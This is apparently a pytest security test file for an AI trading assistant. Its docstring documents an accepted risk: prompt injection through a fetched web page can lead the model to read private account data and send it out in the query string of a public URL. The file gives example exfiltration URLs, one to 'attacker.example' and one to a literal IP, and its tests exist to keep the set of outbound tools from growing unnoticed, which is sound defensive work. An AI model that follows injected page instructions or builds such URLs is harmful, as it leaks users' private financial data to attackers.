"""CLA-SEC-013 — the set of model-directed outbound channels is closed and known.

**The finding this file records, stated plainly.** ClaudIA can be made to read private
account data and then send it to an attacker-chosen public host, in one turn, with no human
approval of the destination. Traced 2026-09-14:

1. A page fetched by `fetch_web_page` (or `fetch_page` / `crawl_site` in the core) reaches
   the model as a `tool_result`. § 1 of the architecture trusts it for nothing; it is the
   prompt-injection vector by design.
2. That content can direct the model to read the account — `get_live_pnl`, positions, the
   ledger, `get_trades`, `search_past_conversations`, `get_doc_version` (which returns the
   operator's own persona and trading rules verbatim).
3. It can then direct the model to fetch a URL. `_validate_public_url` blocks private and
   reserved addresses; **every public host is allowed, and the path and query string are
   whatever the model writes.** `https://attacker.example/?d=<net liquidity>` is a
   well-formed public fetch.

The destination is model-selected and the operator approves nothing. They are not blind to
it — the URL is streamed into the tool's `ChatStep` — but `collapsed_on_success` is `True`
in panel 1.9.3, so the step folds away the moment the fetch succeeds.

**This is an accepted residual, not a bug with a fix being deferred.** The model holds the
data in its context, so a same-turn taint rule is evaded by answering next turn; a
destination allowlist would end web research, which is the tool's purpose; and a
confirmation on every fetch after any account read would fire in almost every session and
be clicked through. Full reasoning: `docs/security-architecture.md` § 9.

**What is enforceable, and is what this file does.** The *channel set* must stay closed and
known. The residual above is accepted on a measured inventory of outbound sinks; a new one
— a tool that POSTs, a webhook, a mail sender, a core tool gaining a body parameter — would
widen the channel from a URL's query string to an arbitrary request body, and every test in
this repository would stay green. That is the failure class this pins: not the exfiltration,
which is documented, but the silent growth of the surface it was accepted on.
"""

from __future__ import annotations

import pytest

from claudia.agent import _LOCAL_TOOLS

# ClaudIA's own tools that make an outbound request to a destination the model names.
# One entry today. Adding a second is a security decision, and the diff should say so.
CLAUDIA_OUTBOUND_TOOLS: frozenset[str] = frozenset({"fetch_web_page"})

# The core's tools that reach the public internet. Computed against the registry below
# rather than trusted from here; listed so a core release that adds one shows up as a named
# difference instead of a silent widening.
#
# `sync_flex_trades` is deliberately included: it carries NETWORK. Its destination is IBKR's
# Flex endpoint and is not model-selectable, which is exactly the distinction the assertions
# below draw — being on this list means "reaches the internet", not "is a risk".
CORE_NETWORK_TOOLS: frozenset[str] = frozenset(
    {
        "fetch_page",  # model names the URL
        "crawl_site",  # model names the root URL
        "search_site",  # model names the domain
        "firecrawl_search",  # model names the query; the host is Firecrawl's, fixed
        "sync_flex_trades",  # IBKR Flex; destination fixed, not model-selectable
    }
)

# Capability names in the core registry that mean "this tool can reach the public internet".
_OUTBOUND_CAPABILITIES = frozenset({"WEB_FETCH", "NETWORK"})


def test_claudia_declares_exactly_one_model_directed_outbound_tool():
    """A second one must be a decision, not a diff.

    Detected structurally rather than by name: a local tool whose schema takes a `url`, a
    `domain`, an `endpoint` or a `webhook` is an outbound channel whatever it is called.
    """
    address_fields = {"url", "uri", "domain", "host", "endpoint", "webhook", "callback"}
    reaching = {
        str(tool["name"])
        for tool in _LOCAL_TOOLS
        if address_fields & set(tool["input_schema"].get("properties", {}))
    }
    assert reaching == CLAUDIA_OUTBOUND_TOOLS, (
        f"ClaudIA's model-directed outbound tools changed: {sorted(reaching)}. "
        "Read docs/security-architecture.md § 9 before widening this — the account-data "
        "exfiltration residual is accepted against this exact set."
    )


def test_no_local_tool_can_carry_a_request_body():
    """The residual is accepted on a GET whose payload is a query string, and only that.

    A tool that accepts a body, a method, headers or a file upload turns a constrained
    channel into an unconstrained one. Nothing in this repository needs that today.
    """
    body_fields = {"body", "data", "payload", "json", "method", "headers", "files", "content"}
    offenders = {
        str(tool["name"]): sorted(body_fields & set(tool["input_schema"].get("properties", {})))
        for tool in _LOCAL_TOOLS
        if body_fields & set(tool["input_schema"].get("properties", {}))
    }
    assert not offenders, f"a local tool gained a request body: {offenders}"


def test_the_core_outbound_set_is_the_one_this_residual_was_accepted_against():
    """A core release that adds a web tool must be read here, not absorbed silently.

    This is the cross-repo half of the residual: ClaudIA hands the model the whole registry
    (`test_cross_repo_contract.py`), so the core's outbound set is ClaudIA's outbound set.
    """
    from ibkr_core_mcp.claude_tools import TOOL_DEFINITIONS

    reaching = {
        str(tool["name"])
        for tool in TOOL_DEFINITIONS
        if _OUTBOUND_CAPABILITIES & frozenset(tool["capabilities"])
    }
    assert reaching == CORE_NETWORK_TOOLS, (
        f"the core's outbound tool set changed: added {sorted(reaching - CORE_NETWORK_TOOLS)}, "
        f"removed {sorted(CORE_NETWORK_TOOLS - reaching)}. Re-read "
        "docs/security-architecture.md § 9 before updating this list."
    )


def test_the_ssrf_guard_is_about_the_destination_being_private_not_about_the_payload():
    """Pins the guard's actual scope, so the residual is not mistaken for a control.

    `_validate_public_url` is a good SSRF control and is not an exfiltration control. Writing
    that down as an executable fact is the point: the same sentence in a document went stale
    six times in this repository before the 2026-09-13 audit.
    """
    from claudia.agent import ClaudIAAgent

    # A literal public address, so the assertion needs no DNS: a blocked lookup escapes the
    # guard's narrow `except` as "Invalid URL", and this test would then pass for the wrong
    # reason (the trap `tests/conftest.py`'s DNS exemption list exists to name).
    exfiltrating = "https://93.184.216.34/collect?net_liquidity=1234567.89&account=U1234567"
    assert ClaudIAAgent._validate_public_url(exfiltrating) is None, (
        "the guard now rejects a well-formed public URL — if that is deliberate, the "
        "residual in § 9 has changed and the document must say so"
    )
    assert ClaudIAAgent._validate_public_url("http://127.0.0.1:5055/v1/api/tickle") is not None


@pytest.mark.parametrize("tool_name", sorted(CLAUDIA_OUTBOUND_TOOLS))
def test_every_outbound_tool_has_its_destination_shown_to_the_operator(tool_name):
    """The operator is not blind to the destination, even though they do not approve it.

    Every tool call's input is streamed into its `ChatStep` by `PanelMessageSink`, escaped.
    That is the whole of the visibility claim in § 9 — and it is worth pinning, because if
    the step ever stopped showing inputs the residual would become genuinely silent.
    """
    import pathlib

    from claudia import panel_sink
    from tests.security.structural import called_names, functions_named

    source = pathlib.Path(panel_sink.__file__).read_text(encoding="utf-8")
    # `input` is a property *and* its setter; the setter is the one that writes to the UI.
    streams = [fn for fn in functions_named(source, "input") if "stream" in called_names(fn)]
    assert streams, (
        f"a tool's input is no longer streamed into its step, so {tool_name}'s destination "
        "is not shown to the operator at all — § 9's residual rests on that visibility"
    )
    assert "escape_markup" in called_names(streams[0]), (
        "the input reaches the step unescaped — a model-chosen URL is a markup sink"
    )
